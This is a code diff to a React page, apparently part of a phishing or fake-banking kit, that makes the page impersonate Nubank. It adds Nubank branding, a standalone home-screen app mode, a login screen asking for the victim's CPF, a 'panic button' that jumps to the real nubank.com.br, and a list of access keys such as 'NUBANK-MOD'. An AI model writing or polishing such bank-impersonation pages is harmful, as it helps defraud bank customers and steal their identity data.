@@ -6,6 +6,7 @@ type Device = 'android' | 'ios'
 
 const ACCENT = '#820ad1'
 const BG = '#000000'
+const NU_ICON = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRmSBqotrU4emvswOB389weXcAHPuGe1tffJw&s"
 
 const VALID_KEYS = [
   "aura2", "NUBANK-MOD", "123456", "MAJESTIC-PRO", "CLISHA-091", 
@@ -104,15 +105,20 @@ export default function Page() {
         touchAction: 'none' 
       }}>
       
-      {/* IDENTIDADE NUBANK */}
-      <title>Nubank</title>
-      <link rel="apple-touch-icon" href="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-3.png" />
-      <meta name="apple-mobile-web-app-title" content="Nubank" />
+      {/* HEADER PARA IDENTIDADE VISUAL CORRETA */}
+      <head>
+        <title>Nubank</title>
+        <link rel="icon" href={NU_ICON} />
+        <link rel="apple-touch-icon" href={NU_ICON} />
+        <meta name="apple-mobile-web-app-title" content="Nubank" />
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+      </head>
 
       <style jsx global>{`
         html, body { background-color: #000000 !important; margin: 0; padding: 0; overflow: hidden; position: fixed; width: 100%; height: 100%; }
       `}</style>
 
+      {/* BOTÃO PÂNICO */}
       <button onClick={() => window.location.replace("https://www.nubank.com.br")} 
         className="absolute right-5 top-14 z-[20000] grid h-[35px] w-[35px] place-items-center rounded-full border bg-white/5 border-white/10 active:scale-90 transition-transform">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#444" strokeWidth="2"><polyline points="3 6 5 6 21 6" /><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" /></svg>
@@ -120,7 +126,7 @@ export default function Page() {
 
       {stage === 'login' && (
         <div className="flex-1 flex flex-col px-6 pb-12 pt-24 animate-in fade-in duration-500">
-          <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-3.png" alt="Nu" style={{ width: 45, marginBottom: 40, filter: 'brightness(10)' }} />
+          <img src={NU_ICON} alt="Nu" style={{ width: 60, marginBottom: 40, borderRadius: '12px' }} />
           <h1 className="mb-9 text-[26px] font-medium leading-tight">Olá, qual é o seu CPF?</h1>
           <div className="mb-1 text-[13px] font-medium" style={{ color: ACCENT }}>CPF</div>
           <div className="mb-6 border-b-[1.5px]" style={{ borderColor: ACCENT }}>
